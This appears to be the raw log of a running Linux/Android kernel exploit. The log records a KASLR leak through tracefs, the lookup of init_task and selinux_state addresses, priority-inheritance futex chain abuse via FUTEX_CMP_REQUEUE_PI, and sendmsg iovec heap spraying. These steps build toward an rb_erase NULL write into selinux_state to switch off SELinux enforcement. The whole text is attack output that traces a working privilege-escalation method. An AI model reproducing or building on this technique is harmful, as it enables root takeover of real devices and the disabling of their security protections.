[main] g_iov_idx=0 (override with IOV_IDX=k)  spray=sendmsg
[kaslr] tracefs base=ffffffe7c0e00000 slide=00000027b8e00000 (mode cnt 2457, samples 4096)
[kaslr] base=0xffffffe7c0e00000 slide=0x27b8e00000
  init_task   = 0xffffffe7cba43640
  selinux_state = 0xffffffe7cbba9d78 (enforcing @ +0)
  fake_lock   = 0xffffffe7cba43640 (uid_lock+0x200, ZEROED BSS rt_mutex)
  fake_lock2  = 0xffffffe7cba43640 (uid_lock+0x300, ZEROED BSS rt_mutex)
  safe_write  = 0xffffffe7cbb53000 (empty_zero_page: low byte 0x00, byte2 0x53)
[Y] tid=9827
[X] tid=9828
[main] topology ready; FUTEX_CMP_REQUEUE_PI(cond) -> cycle
[main] CMP_REQUEUE_PI returned -35 (Resource deadlock would occur)
[main] -EDEADLK: full chainwalk caught PI cycle
[Y] PHASE1 spray: settle ghost (d=0 method=sendmsg: li=0 parent@iov0..2)
[Y] SPRAY-DEBUG iovstack base=0x278080  &iov[4]=0x2780c0  method=sendmsg
[Z] tid=9837
[Z] FUTEX_LOCK_PI(L2): walk into pi_blocked_on
[do_2] Z blocked on L2 — chain walk survived
[phase1] sched_setscheduler(Y) -> rb_erase NULL write to root (settle)
[phase1] chain walk OK (kernel alive)
[phase2] request re-spray (parent=selinux-8, lock=fake_lock2 @ uid_lock+0x300)
[Y] PHASE2 spray: d=0 li=0 parent=selinux-8 rb_right=safe(empty_zero_page) rb_left=0 lock=fake_lock2
[phase2] sched_setscheduler(Y) -> rb_erase NULL write to selinux
